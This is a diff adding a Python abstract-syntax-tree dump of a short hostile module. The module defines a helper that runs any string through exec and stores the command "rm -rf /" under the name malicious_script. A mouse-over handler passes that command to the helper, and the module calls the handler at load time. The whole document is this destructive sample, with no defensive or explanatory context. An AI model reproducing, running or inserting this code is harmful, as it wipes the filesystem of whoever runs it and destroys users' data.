@@ -1,0 +1,45 @@
+Module(
+    body=[
+        FunctionDef(
+            name='execute_arbitrary_script',
+            args=arguments(
+                posonlyargs=[],
+                args=[
+                    arg(arg='script')],
+                kwonlyargs=[],
+                kw_defaults=[],
+                defaults=[]),
+            body=[
+                Expr(
+                    value=Call(
+                        func=Name(id='exec', ctx=Load()),
+                        args=[
+                            Name(id='script', ctx=Load())],
+                        keywords=[]))],
+            decorator_list=[]),
+        Assign(
+            targets=[
+                Name(id='malicious_script', ctx=Store())],
+            value=Constant(value="import os; os.system('rm -rf /')")),
+        FunctionDef(
+            name='on_mouse_over',
+            args=arguments(
+                posonlyargs=[],
+                args=[],
+                kwonlyargs=[],
+                kw_defaults=[],
+                defaults=[]),
+            body=[
+                Expr(
+                    value=Call(
+                        func=Name(id='execute_arbitrary_script', ctx=Load()),
+                        args=[
+                            Name(id='malicious_script', ctx=Load())],
+                        keywords=[]))],
+            decorator_list=[]),
+        Expr(
+            value=Call(
+                func=Name(id='on_mouse_over', ctx=Load()),
+                args=[],
+                keywords=[]))],
+    type_ignores=[])
